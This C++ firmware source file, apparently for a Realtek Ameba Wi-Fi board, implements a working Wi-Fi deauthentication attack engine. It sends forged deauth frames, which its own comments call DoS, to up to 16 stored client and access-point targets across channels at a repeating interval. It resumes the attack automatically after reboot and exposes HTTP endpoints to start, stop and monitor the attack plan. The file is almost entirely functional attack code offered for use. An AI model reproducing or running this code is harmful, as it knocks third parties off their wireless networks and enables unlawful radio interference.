#include <Arduino.h>
#include <WiFi.h>
#include <main.h>
#include <wifi_conf.h>
#include <ArduinoJson.h>
#include "api_all.h"
#include "attacker.h"
#include "wifi_cust_tx.h"
#include "utils.h"
#include "ap_powersave.h"
#include "settings.h"
#include "wifi_drv.h"

#include "FreeRTOS.h"
#include "timers.h"

#ifdef __cplusplus
extern "C" {
#include "ameba_soc.h"
}
#endif

#define ATTACK_BOOT_HOLD_SEC 30  // 开机延迟 30 秒执行攻击（出bug时不至于拖 SoftAP 下水）
#define ATTACK_ROUND_PACKETS 4      // 每个目标每轮发包数（与 test-deauth 一致）

// 引擎状态（统计与运行标志不落盘）
static volatile bool g_attack_running = false;
static uint32_t g_next_fire_ms = 0;
static uint8_t g_start_channel = 1;  // 攻击启动时信道，停止时恢复
static uint32_t g_attack_rounds = 0;
static uint32_t g_attack_packets = 0;
static TimerHandle_t s_bootDelayTimer = NULL;

static bool isChannelValid(int ch) {
    if (ch >= 1 && ch <= 14) return true;
    switch (ch) {
        case 36: case 40: case 44: case 48:
        case 52: case 56: case 60: case 64:
        case 100: case 104: case 108: case 112:
        case 116: case 120: case 124: case 128:
        case 132: case 136: case 140: case 144:
        case 149: case 153: case 157: case 161:
        case 165: return true;
        default: return false;
    }
}

// 切换收发信道（与 api_scan/test-deauth 相同的切信道流程）
// AP 挂起期间只切 WLAN0（STA 侧）信道，跳过 wifi_ap_switch_chl_and_inform
static bool switchChannel(int ch) {
    if (ch == ap_channel) return true;
    if (!apPowerSaveIsSuspended()) {
        if (wifi_ap_switch_chl_and_inform(ch) != RTW_SUCCESS) {
            Serial.print("[ATTACK] wifi_ap_switch_chl_and_inform failed, ch=");
            Serial.println(ch);
            return false;
        }
    }
    wext_set_channel(WLAN0_NAME, ch);  // 必须，上面的调用不够
    ap_channel = ch;
    delay(100);
    return true;
}

// 最小唤醒：仅拉起 RF 到能发 raw 帧的程度，不恢复 beacon、不重建安全上下文，
// 不经过 rltk_resume_softap / remountSoftAPBeacon，省电状态机保持"挂起"不变
static void minimalRadioWake() {
    if (!apPowerSaveIsSuspended()) return;
    if (wifi_disable_powersave() != RTW_SUCCESS) {
        Serial.println("[ATTACK] minimal wake: wifi_disable_powersave failed");
    }
    delay(5);
}

static void minimalRadioSleep() {
    if (apPowerSaveIsSuspended()) {
        wifi_enable_powersave();  // RF 重新关闭，继续挂起省电
    }
}

static void sendBurstForChannel(uint8_t ch) {
    for (int i = 0; i < g_appSettings.attack_target_count; i++) {
        AttackTargetRecord& t = g_appSettings.attack_targets[i];
        if (t.channel != ch) continue;
        for (int p = 0; p < ATTACK_ROUND_PACKETS; p++) {
            // 伪造客户端单方向往 AP 发 deauth（DoS），与 test-deauth 相同帧方向
            wifi_tx_deauth_frame_ext(t.mac, t.bssid, t.bssid, 0x03);
            g_attack_packets++;
        }
    }
}

// 执行一轮攻击：按信道分组切换信道发包，结束后恢复启动时信道
static void runAttackRound() {
    bool was_suspended = apPowerSaveIsSuspended();
    if (was_suspended) minimalRadioWake();

    // 收集目标信道（去重）
    uint8_t channels[MAX_ATTACK_TARGETS];
    int channel_count = 0;
    for (int i = 0; i < g_appSettings.attack_target_count; i++) {
        uint8_t ch = g_appSettings.attack_targets[i].channel;
        bool dup = false;
        for (int j = 0; j < channel_count; j++) {
            if (channels[j] == ch) { dup = true; break; }
        }
        if (!dup) channels[channel_count++] = ch;
    }

    for (int c = 0; c < channel_count; c++) {
        if (switchChannel(channels[c])) {
            sendBurstForChannel(channels[c]);
        }
    }
    Serial.println("[ATTACK] deauth sent");
    switchChannel(g_start_channel);

    if (was_suspended) minimalRadioSleep();

    g_attack_rounds++;
    g_next_fire_ms = millis() + g_appSettings.attack_interval_ms;
}

static void onBootGracePeriodExpired(TimerHandle_t xTimer) {
    (void)xTimer;
    g_attack_running = true;
    g_start_channel = ap_channel;
    g_next_fire_ms = millis();  // 保护期结束，第一轮立即开火
    g_attack_rounds = 0;
    g_attack_packets = 0;
    Serial.println("[ATTACK] Boot grace period expired -> attack auto-resumed!");
}

void attackerInit() {
    g_attack_running = false;

    // 重启后如果攻击计划处于开启状态，推迟 30 秒执行（给 SoftAP 连接预留安全窗口）
    if (g_appSettings.attack_enabled == 1 && g_appSettings.attack_target_count > 0) {
        if (s_bootDelayTimer == NULL) {
            s_bootDelayTimer = xTimerCreate(
                "AtkBootTimer",
                pdMS_TO_TICKS(ATTACK_BOOT_HOLD_SEC * 1000),
                pdFALSE,
                (void*)0,
                onBootGracePeriodExpired
            );
        }
        if (s_bootDelayTimer != NULL) {
            xTimerStart(s_bootDelayTimer, 0);
            Serial.print("[ATTACK] attack auto-resume postponed by ");
            Serial.print(ATTACK_BOOT_HOLD_SEC);
            Serial.println("s (grace period for AP connection)");
        } else {
            Serial.println("[ATTACK] Failed to create boot delay timer!");
        }
    }
}

void attackerTick() {
    if (!g_attack_running || g_appSettings.attack_target_count == 0) return;

    uint32_t now = millis();
    if (now < g_next_fire_ms) {
        return;
    }

    runAttackRound();
}

// 距离下次开火毫秒数；未启用/无目标返回 UINT32_MAX；已到点返回 0
uint32_t attackerMsUntilNextFire() {
    if (!g_attack_running || g_appSettings.attack_target_count == 0) return UINT32_MAX;
    uint32_t remain = g_next_fire_ms - millis();
    if (remain > 0x80000000UL) return 0;  // 时间已到（含溢出保护）
    return remain;
}

bool attackerIsRunning() {
    return g_attack_running;
}

void handleAttackStatusApi(HttpClient& client) {
    JsonDocument doc;
    doc["success"] = true;
    doc["enabled"] = g_attack_running;
    doc["type"] = (g_appSettings.attack_type == ATTACK_TYPE_DEAUTH) ? "deauth" : "unknown";
    doc["interval_sec"] = g_appSettings.attack_interval_ms / 1000.0;
    doc["ap_powersave_enabled"] = (g_appSettings.ap_powersave_enable == 1);
    doc["ap_saver_state"] = apPowerSaveStateName();
    doc["ap_channel"] = ap_channel;
    doc["rounds"] = g_attack_rounds;
    doc["packets"] = g_attack_packets;
    if (g_attack_running) {
        uint32_t remain = g_next_fire_ms - millis();
        doc["next_fire_ms"] = (remain > 0x80000000UL) ? 0 : remain;
    } else {
        doc["next_fire_ms"] = 0;
    }

    JsonArray targets = doc["targets"].to<JsonArray>();
    for (int i = 0; i < g_appSettings.attack_target_count; i++) {
        AttackTargetRecord& t = g_appSettings.attack_targets[i];
        JsonObject o = targets.add<JsonObject>();
        o["mac"] = formatMac(t.mac);
        o["bssid"] = formatMac(t.bssid);
        o["ssid"] = t.ssid;
        o["channel"] = t.channel;
        o["rssi"] = t.rssi;
    }
    client.sendJson(doc);
}

void handleAttackPlanApi(HttpClient& client) {
    if (client.method() != "POST") {
        client.sendJsonFail("Only POST method is allowed");
        return;
    }

    JsonDocument req;
    DeserializationError error = deserializeJson(req, client.body());
    if (error) {
        client.sendJsonFail("Invalid JSON body");
        return;
    }

    if (!req.containsKey("enabled")) {
        client.sendJsonFail("Missing enabled parameter");
        return;
    }
    bool enable = req["enabled"].as<bool>();

    JsonArray tarr = req["targets"].as<JsonArray>();
    if (tarr.isNull()) {
        client.sendJsonFail("Missing targets");
        return;
    }
    if (tarr.size() > MAX_ATTACK_TARGETS) {
        client.sendJsonFail("Too many targets (max 16)");
        return;
    }

    int type = req["type"] | (int)ATTACK_TYPE_DEAUTH;
    if (type < 0 || type >= ATTACK_TYPE_COUNT) {
        client.sendJsonFail("Unknown attack type");
        return;
    }

    double interval_sec = req["interval_sec"] | 5.0;
    if (interval_sec < 1.0 || interval_sec > 3600.0) {
        client.sendJsonFail("interval_sec must be between 1 and 3600");
        return;
    }
    uint32_t interval_ms = (uint32_t)(interval_sec * 1000.0 + 0.5);

    // 校验并解析目标列表
    AttackTargetRecord parsed[MAX_ATTACK_TARGETS];
    int count = 0;
    for (JsonObject t : tarr) {
        const char* macStr = t["mac"] | "";
        const char* bssidStr = t["bssid"] | "";
        uint8_t mac[6], bssid[6];
        if (strlen(macStr) == 0 || strlen(bssidStr) == 0 ||
            !parseMac(macStr, mac) || !parseMac(bssidStr, bssid)) {
            client.sendJsonFail("Invalid mac or bssid");
            return;
        }
        int ch = t["channel"] | 0;
        if (!isChannelValid(ch)) {
            client.sendJsonFail("Invalid channel");
            return;
        }
        for (int i = 0; i < count; i++) {
            if (memcmp(parsed[i].mac, mac, 6) == 0 && memcmp(parsed[i].bssid, bssid, 6) == 0) {
                client.sendJsonFail("Duplicate target");
                return;
            }
        }
        AttackTargetRecord& rec = parsed[count];
        memset(&rec, 0, sizeof(rec));
        memcpy(rec.mac, mac, 6);
        memcpy(rec.bssid, bssid, 6);
        rec.channel = (uint8_t)ch;
        const char* ssid = t["ssid"] | "";
        strncpy(rec.ssid, ssid, 32);
        rec.ssid[32] = '\0';
        rec.rssi = (int8_t)(t["rssi"] | 0);
        count++;
    }

    if (enable && count == 0) {
        client.sendJsonFail("No targets in plan");
        return;
    }

    // 一次性写入闪存（开始/停止时，避免频繁擦写）
    g_appSettings.attack_enabled = enable ? 1 : 0;
    g_appSettings.attack_type = (uint8_t)type;
    g_appSettings.attack_interval_ms = interval_ms;
    g_appSettings.attack_target_count = (uint8_t)count;
    for (int i = 0; i < count; i++) {
        g_appSettings.attack_targets[i] = parsed[i];
    }

    if (!saveSettings()) {
        client.sendJsonFail("Failed to write settings to FlashMemory");
        return;
    }

    // 取消可能正在等待的开机保护定时器
    if (s_bootDelayTimer != NULL) {
        if (xTimerIsTimerActive(s_bootDelayTimer) != pdFALSE) {
            xTimerStop(s_bootDelayTimer, 0);
            Serial.println("[ATTACK] Boot delay timer canceled by API");
        }
    }

    // 同步引擎
    if (enable) {
        g_attack_running = true;
        g_start_channel = ap_channel;
        g_attack_rounds = 0;
        g_attack_packets = 0;
        g_next_fire_ms = millis();  // 首轮立即执行
        Serial.print("[ATTACK] plan started, targets=");
        Serial.print(count);
        Serial.print(" interval=");
        Serial.println(g_appSettings.attack_interval_ms / 1000.0f);
    } else {
        g_attack_running = false;
        switchChannel(g_start_channel);  // 恢复攻击启动前信道
        Serial.println("[ATTACK] plan stopped");
    }

    JsonDocument resp;
    resp["success"] = true;
    resp["enabled"] = g_attack_running;
    resp["message"] = enable ? "Attack plan saved and started" : "Attack plan saved and stopped";
    client.sendJson(resp);
}
